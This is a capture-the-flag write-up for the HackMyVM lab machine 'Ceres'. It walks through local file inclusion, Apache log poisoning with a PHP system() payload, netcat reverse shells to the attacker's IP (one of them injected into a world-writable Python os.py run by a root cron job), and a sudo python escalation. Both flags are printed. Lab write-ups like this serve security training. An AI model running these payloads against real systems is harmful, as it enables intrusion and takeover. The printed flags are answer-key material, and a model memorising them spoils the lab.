                                                 ▄████▄  ▓█████  ██▀███  ▓█████   ██████ 
                                                ▒██▀ ▀█  ▓█   ▀ ▓██ ▒ ██▒▓█   ▀ ▒██    ▒ 
                                                ▒▓█    ▄ ▒███   ▓██ ░▄█ ▒▒███   ░ ▓██▄   
                                                ▒▓▓▄ ▄██▒▒▓█  ▄ ▒██▀▀█▄  ▒▓█  ▄   ▒   ██▒
                                                ▒ ▓███▀ ░░▒████▒░██▓ ▒██▒░▒████▒▒██████▒▒
                                                ░ ░▒ ▒  ░░░ ▒░ ░░ ▒▓ ░▒▓░░░ ▒░ ░▒ ▒▓▒ ▒ ░
                                                  ░  ▒    ░ ░  ░  ░▒ ░ ▒░ ░ ░  ░░ ░▒  ░ ░
                                                ░           ░     ░░   ░    ░   ░  ░  ░  
                                                ░ ░         ░  ░   ░        ░  ░      ░  
                                                ░                                        



#### ***Source: https://hackmyvm.eu/machines/machine.php?vm=Ceres***  
#### ***Difficulty: Medium***  
#### ***Remote Target IP: 10.0.0.17***  
#### ***Local Target IP: 10.0.0.27***  

## ***NMAP***

    # nmap -sS -T4 -p- 10.0.0.17

    PORT   STATE SERVICE
    22/tcp open  ssh
    80/tcp open  http

## ***HTTP***

Let's start by enumerating HTTP on port 80.

    # gobuster dir -u http://10.0.0.17/ -w /usr/share/wordlists/dirbuster/directory-list-1.0.txt -x txt, html, php

    /planet               (Status: 301) [Size: 307] [--> http://10.0.0.17/planet/]
    /robots.txt           (Status: 200) [Size: 27]  

Checking our the robots.txt file on the server we have a rabbit hole.

![image](https://user-images.githubusercontent.com/76552238/172728630-34c8ef6d-445d-434a-8599-cebd506e9756.png)

BUT! going to ***http://10.0.0.17/planet*** we might have something interesting.

![image](https://user-images.githubusercontent.com/76552238/172728727-d2e195ac-8576-49b7-b4ca-7f706ed22b0e.png)

Let's brute force it's directories.

    # gobuster dir -u http://10.0.0.17/planet -w /usr/share/wordlists/dirbuster/directory-list-1.0.txt -x txt,html,php,zip,bak

    /index.html           (Status: 200) [Size: 80]
    /file.php             (Status: 200) [Size: 0] 
    /secret.php           (Status: 200) [Size: 54]

Going to ***http://10.0.0.17/planet/secret.php*** we seem to get the output of the ***whoami*** command on the remote machine

    uid=33(www-data) gid=33(www-data) groups=33(www-data) 

Going to ***http://10.0.0.17/planet/file.php*** we don't any output from the file. Since this is a PHP file I tired passing arguments in the url.

***http://10.0.0.17/planet/file.php?file=secret.php*** doesn't show anything but ***http://10.0.0.17/planet/file.php?file=secret*** outputs the content of the ***secret.php*** file. 

![image](https://user-images.githubusercontent.com/76552238/172730465-56360db9-88bc-456a-b832-8649bd8c3aba.png)

This might indicate that this file is vulnerable to a LFI. I remember from a different machine I did, that something similar happened. I had used a PHP filter wrapper to encode the code of the local file with Base64 and after decoding it I got it's source code. Let's see if this works here as well.

Using this article here I was able to get it to work.
***https://medium.com/@nyomanpradipta120/local-file-inclusion-vulnerability-cfd9e62d12cb***

    # curl 'http://10.0.0.17/planet/file.php?file=php://filter/convert.base64-encode/resource=secret' | base64 -d
    % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                    Dload  Upload   Total   Spent    Left  Speed
    100    88  100    88    0     0  91571      0 --:--:-- --:--:-- --:--:-- 88000
    <?php
        system("id"); //                  /My_H1dd3n_S3cr3t
    ?>

Looking at the comment in the source code of ***secret.php*** it looks like a directory. Let's try to go to ***http://10.0.0.17/planet/My_H1dd3n_S3cr3t***. After going to the directory we don't get an error. This means this directory is on the remote machine. Let's try to brute force it's directories.

    # gobuster dir -u http://10.0.0.17/planet/My_H1dd3n_S3cr3t/ -w /usr/share/wordlists/dirbuster/directory-list-1.0.txt -x txt,php,html

    /index.html           (Status: 200) [Size: 4]
    /file.php             (Status: 200) [Size: 0]

Once again we have a possible LFI, going to ***http://10.0.0.17/planet/My_H1dd3n_S3cr3t/file.php*** let's see if we can read any files using the ***file*** parameter.

    # curl 'http://10.0.0.17/planet/My_H1dd3n_S3cr3t/file.php?file=../../../../../etc/passwd'

    root:x:0:0:root:/root:/bin/bash
    daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
    bin:x:2:2:bin:/bin:/usr/sbin/nologin
    sys:x:3:3:sys:/dev:/usr/sbin/nologin
    sync:x:4:65534:sync:/bin:/bin/sync
    games:x:5:60:games:/usr/games:/usr/sbin/nologin
    man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
    lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
    mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
    news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
    uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
    proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
    www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
    backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
    list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
    irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
    gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
    nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
    _apt:x:100:65534::/nonexistent:/usr/sbin/nologin
    systemd-timesync:x:101:102:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin
    systemd-network:x:102:103:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin
    systemd-resolve:x:103:104:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin
    messagebus:x:104:110::/nonexistent:/usr/sbin/nologin
    sshd:x:105:65534::/run/sshd:/usr/sbin/nologin
    giuseppe:x:1000:1000:giuseppe,,,:/home/giuseppe:/bin/bash
    systemd-coredump:x:999:999:systemd Core Dumper:/:/usr/sbin/nologin

The user ***'giuseppe'*** is on the remote machine.  
Since this site is running on ***apache2*** let's try to view it's log files and try to  poison them.

Going to ***http://10.0.0.17/planet/My_H1dd3n_S3cr3t/file.php?file=../../../../../../../var/log/apache2/access.log*** we can see all the requests to the remote server. Let's use ***curl*** and add some PHP code as a header so it is executed once we open the log file. 

    # curl http://10.0.0.17 -A "<php? system($_GET['cmd'])?>"

Now we can run arbitrary commands on the remote machine and get a reverse shell on our local machine. But since we are adding the payload in the url let's encode it.

    payload: nc 10.0.0.27 4444 -e /bin/bash

    url encoding: %6e%63%20%31%30%2e%30%2e%30%2e%32%37%20%34%34%34%34%20%2d%65%20%2f%62%69%6e%2f%62%61%73%68

>

    Remote Machine:

    # curl "http://10.0.0.17/planet/My_H1dd3n_S3cr3t/file.php?file=../../../../../../../var/log/apache2/access.log&cmd=%6e%63%20%31%30%2e%30%2e%30%2e%32%37%20%34%34%34%34%20%2d%65%20%2f%62%69%6e%2f%62%61%73%68"

    Local Machine:

    # nc -lnvp 4444
    listening on [any] 4444 ...
    connect to [10.0.0.27] from (UNKNOWN) [10.0.0.17] 44968
    whoami
    www-data

We are now logged in to the remote machine as the user ***'www-data'***. Let's try to get higher privileges.

## ***PRIVILEGE ESCALATION***

When we read the ***/etc/passwd*** file on the remote machine earlier we found a user named ***'giuseppe'***. Going to the ***/home*** directory we can find his directory.

    $ pwd
    /home
    $ ls -l
    total 4
    drwxr-xr-x 4 giuseppe giuseppe 4096 Mar  7  2021 giuseppe

Going into the directory we can find the first flag, but we don't the permissions to read it.

    $ ls -la /home/giuseppe
    total 44
    drwxr-xr-x 4 giuseppe giuseppe 4096 Mar  7  2021 .
    drwxr-xr-x 3 root     root     4096 Mar  6  2021 ..
    -rw------- 1 giuseppe giuseppe    1 Jun  9 01:31 .bash_history
    -rw-r--r-- 1 giuseppe giuseppe  220 Mar  6  2021 .bash_logout
    -rw-r--r-- 1 giuseppe giuseppe 3766 Mar  6  2021 .bashrc
    drwxr-xr-x 3 giuseppe giuseppe 4096 Mar  6  2021 .local
    -rw-r--r-- 1 giuseppe giuseppe  807 Mar  6  2021 .profile
    drwxr-xr-x 2 root     root     4096 Mar  6  2021 .ssh
    -rw-r--r-- 1 giuseppe giuseppe  180 Mar  7  2021 .wget-hsts
    -rw-r--r-- 1 root     root        1 Jun  9 01:31 .zsh_history
    -rw------- 1 giuseppe giuseppe   26 Mar  7  2021 user.txt

Going to the ***/home/giuseppe/.ssh*** directory we have a private key, but it's just another rabbit hole.

    $ cat /home/giuseppe/.ssh/id_rsa
    ¿really?

:'(

    $ sudo -ll

        Matching Defaults entries for www-data on Ceres:                                                           
        env_reset, mail_badpass,                                                                               
        secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin                          
                                                                                                            
    User www-data may run the following commands on Ceres:                                                     
                                                                                                            
    Sudoers entry:                                                                                             
        RunAsUsers: giuseppe                                                                                   
        Options: !authenticate                                                                                 
        Commands:                                                                                              
            /usr/bin/python  

The user ***'www-data'*** can run the ***python*** command as the user ***'giuseppe'*** without a password. We can open a python shell and open a bash shell as the user ***'giuseppe'***.

    $ sudo -u giuseppe python
    >>> import os
    >>> os.system('/bin/bash')

    $ id -a                                                                                                                                               
    uid=1000(giuseppe) gid=1000(giuseppe) groups=1000(giuseppe),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev),109(netdev)  

We can now read the first flag.

    $ cat /home/giuseppe/user.txt
                                                                                 
    94RwRK2XuVdjThtn6GK3kGAXe

Let's upload ***pspy64*** to the remote machine and see if there are any cron tabs running.

    2022/06/09 01:52:01 CMD: UID=0    PID=620    | /usr/sbin/CRON -f 
    2022/06/09 01:52:01 CMD: UID=0    PID=621    | /usr/sbin/CRON -f 
    2022/06/09 01:52:01 CMD: UID=0    PID=622    | /bin/sh -c /opt/important.py 

The file ***/opt/important.py*** is being run by root as part of the cron jobs.

    $ cat /opt/important.py

    #!/usr/bin/python

    import os

    #a = "nananananananananananananananananannanana"
    #b = "lahlahlahlahlahlahlahlahlahlahlahlhalhall"
    #c = "PythonLoverPythonLoverPythonLoverPythonLo"
    #d = "FuckMyVMFuckMyVMFuckMyVMFuckMyVMFuckMyVMF"
    #e = "nahnahnahlalalanahnahnahnahanhahnahhaahaa"
    #f = "rootrootrootrootrootrootrootrootrootrootr"


    #command1 = "/usr/bin/chmod +s /bin/bash"
    #command2 = "/bin/bash -p"
    #command3 = "/usr/bin/whoami"


    #os.system(command1)
    #os.system(command2)
    #os.system(command3)

This file is using the ***os*** python module. If we can edit the module we can make the cron tab run our desired commands.

    $ ls -l /usr/lib/python2.7/os.py
    -rwxrwxrwt 1 root root 25911 Jun  8 20:50 /usr/lib/python2.7/os.py


Going to ***/usr/lib/python2.7*** we can see that ***os.py*** file is writable by everyone, so let's add some code to it, so when the cron tab runs the script ***/opt/important.py*** it also runs our injected code.

    Remote Machine:

    $ echo 'import os' >> /usr/lib/python2.7/os.py
    $ echo 'os.system("nc 10.0.0.27 5555 -e /bin/bash")' >> /usr/lib/python2.7/os.py

    Local Machine:
    # nc -lnvp 5555

    listening on [any] 5555 ...
    connect to [10.0.0.27] from (UNKNOWN) [10.0.0.17] 43332
    # id
    uid=0(root) gid=0(root) grupos=0(root)

We have successfully gained a root shell on the remote machine. Now let's read the final flag and finish the CTF.

    # cat /root/root.txt

    W5bnxUKrVSHpvEpJ6mwFVgVH6
